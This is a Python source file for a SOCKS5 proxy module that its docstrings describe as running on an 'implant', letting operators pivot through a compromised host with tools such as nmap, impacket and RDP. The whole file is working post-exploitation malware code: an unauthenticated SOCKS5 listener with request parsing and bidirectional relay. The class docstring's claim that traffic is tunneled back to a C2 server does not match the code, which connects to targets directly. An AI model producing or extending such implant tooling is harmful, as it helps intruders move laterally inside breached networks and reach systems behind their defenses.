"""SOCKS4/5 proxy server that tunnels traffic through the implant.
Allows operators to pivot through the compromised host using tools like nmap,
impacket, RDP, etc."""

import socket
import struct
import threading
import select
import time
from typing import Optional


class SOCKSProxy:
    """SOCKS5 proxy server running on the implant.
    All connections are tunneled back to the operator's C2 server, which
    connects to the actual target on behalf of the implant."""

    def __init__(self, bind_addr: str = "127.0.0.1", bind_port: int = 1080):
        self.bind_addr = bind_addr
        self.bind_port = bind_port
        self._running = False
        self._server_socket: Optional[socket.socket] = None
        self._active_tunnels: list = []

    def start(self):
        """Start the SOCKS5 proxy listener."""
        self._running = True
        self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_socket.settimeout(1.0)
        self._server_socket.bind((self.bind_addr, self.bind_port))
        self._server_socket.listen(10)
        print(f"SOCKS5 proxy listening on {self.bind_addr}:{self.bind_port}")

        accept_thread = threading.Thread(target=self._accept_loop, daemon=True)
        accept_thread.start()

    def stop(self):
        """Stop the SOCKS proxy and close all tunnels."""
        self._running = False
        if self._server_socket:
            self._server_socket.close()
        for tunnel in self._active_tunnels:
            tunnel.close()
        self._active_tunnels.clear()

    def _accept_loop(self):
        """Accept incoming SOCKS connections."""
        while self._running:
            try:
                client_sock, addr = self._server_socket.accept()
                tunnel_thread = threading.Thread(
                    target=self._handle_client, args=(client_sock,), daemon=True
                )
                tunnel_thread.start()
            except socket.timeout:
                continue
            except OSError:
                break

    def _handle_client(self, client_sock: socket.socket):
        """Handle a single SOCKS5 client connection."""
        tunnel = Tunnel(client_sock)
        self._active_tunnels.append(tunnel)

        try:
            if not tunnel.handle_socks5_handshake():
                tunnel.close()
                return

            target_host, target_port = tunnel.parse_socks5_request()
            if not target_host:
                tunnel.close()
                return

            # Connect to the actual target
            try:
                remote_sock = socket.create_connection((target_host, target_port), timeout=10)
                tunnel.send_success()
            except (socket.error, OSError) as e:
                print(f"SOCKS: failed to connect to {target_host}:{target_port} — {e}")
                tunnel.send_failure()
                tunnel.close()
                return

            # Bidirectional relay
            tunnel.relay(remote_sock)

        except Exception as e:
            print(f"SOCKS tunnel error: {e}")
        finally:
            tunnel.close()
            if tunnel in self._active_tunnels:
                self._active_tunnels.remove(tunnel)


class Tunnel:
    """Handles one SOCKS5 connection."""

    def __init__(self, client_sock: socket.socket):
        self.client_sock = client_sock
        self.remote_sock: Optional[socket.socket] = None

    def handle_socks5_handshake(self) -> bool:
        """SOCKS5 greeting and auth negotiation."""
        try:
            version, nmethods = struct.unpack("!BB", self.client_sock.recv(2))
            if version != 0x05:
                return False

            methods = self.client_sock.recv(nmethods)

            # Respond: version 5, no auth required
            self.client_sock.send(struct.pack("!BB", 0x05, 0x00))
            return True
        except Exception:
            return False

    def parse_socks5_request(self) -> tuple[Optional[str], int]:
        """Parse SOCKS5 CONNECT request."""
        try:
            header = self.client_sock.recv(4)
            if len(header) < 4:
                return None, 0

            version, cmd, rsv, atyp = struct.unpack("!BBBB", header)
            if version != 0x05 or cmd != 0x01:  # Only CONNECT supported
                self.send_failure()
                return None, 0

            if atyp == 0x01:  # IPv4
                raw_addr = self.client_sock.recv(4)
                target_host = socket.inet_ntoa(raw_addr)
            elif atyp == 0x03:  # Domain name
                domain_len = ord(self.client_sock.recv(1))
                target_host = self.client_sock.recv(domain_len).decode()
            elif atyp == 0x04:  # IPv6
                raw_addr = self.client_sock.recv(16)
                target_host = socket.inet_ntop(socket.AF_INET6, raw_addr)
            else:
                self.send_failure()
                return None, 0

            raw_port = self.client_sock.recv(2)
            target_port = struct.unpack("!H", raw_port)[0]
            return target_host, target_port

        except Exception:
            return None, 0

    def send_success(self):
        """Send SOCKS5 success response."""
        # RESP: version=5, reply=success, reserved=0, atyp=IPv4, bound_addr=0.0.0.0:0
        resp = struct.pack("!BBBB4sH", 0x05, 0x00, 0x00, 0x01,
                           socket.inet_aton("0.0.0.0"), 0)
        self.client_sock.send(resp)

    def send_failure(self):
        """Send SOCKS5 failure response."""
        # RESP: version=5, reply=general failure
        resp = struct.pack("!BBBB4sH", 0x05, 0x01, 0x00, 0x01,
                           socket.inet_aton("0.0.0.0"), 0)
        self.client_sock.send(resp)

    def relay(self, remote_sock: socket.socket):
        """Bidirectional data relay between client and remote sockets."""
        self.remote_sock = remote_sock
        self.client_sock.settimeout(1.0)
        self.remote_sock.settimeout(1.0)

        sockets = [self.client_sock, self.remote_sock]

        while True:
            try:
                readable, _, exceptional = select.select(sockets, [], sockets, 5.0)

                if exceptional:
                    break

                for sock in readable:
                    data = sock.recv(65536)
                    if not data:
                        return  # One side closed

                    if sock is self.client_sock:
                        self.remote_sock.sendall(data)
                    else:
                        self.client_sock.sendall(data)

            except (socket.timeout, socket.error, OSError):
                break

    def close(self):
        """Close both ends of the tunnel."""
        for sock in (self.client_sock, self.remote_sock):
            if sock:
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                try:
                    sock.close()
                except OSError:
                    pass
